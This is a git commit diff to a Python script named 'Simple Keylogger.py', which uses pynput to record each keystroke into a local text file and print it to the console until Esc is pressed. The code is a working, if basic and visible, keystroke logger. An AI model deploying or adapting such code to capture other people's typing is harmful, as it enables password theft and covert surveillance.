0fdb37b29eeab512d226bcaf6068c5d6c73a3642
Shash0506 <Sharanyaanand2005@gmail.com>
2025-04-05 16:01:25 +0530

    Update Simple Keylogger.py

--- Simple Keylogger.py
+++ Simple Keylogger.py
@@ -1,21 +1,20 @@
-from pynput import keyboard
-import logging
-from datetime import datetime
-
-# Create a unique log file with a timestamp
-log_file = f"key_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-
-# Configure logging
-logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+from pynput import keyboard 
 
 def on_press(key):
     try:
-        logging.info(f"Key pressed: {key.char}")
+        print(f"Pressed: {key.char}")
+        with open("keylogger.txt", "a") as f:
+            f.write(key.char)
     except AttributeError:
-        # For special keys (e.g., ctrl, alt, etc.)
-        logging.info(f"Special key pressed: {key}")
+        print(f"Pressed: {key}")
+        with open("keylogger.txt", "a") as f:
+            f.write(f"[{key}]")
 
-# Start listening to the keyboard
-with keyboard.Listener(on_press=on_press) as listener:
-    print(f"[INFO] Logging keystrokes to: {log_file}")
+def on_release(key):
+    if key == keyboard.Key.esc:
+       
+        return False
+
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
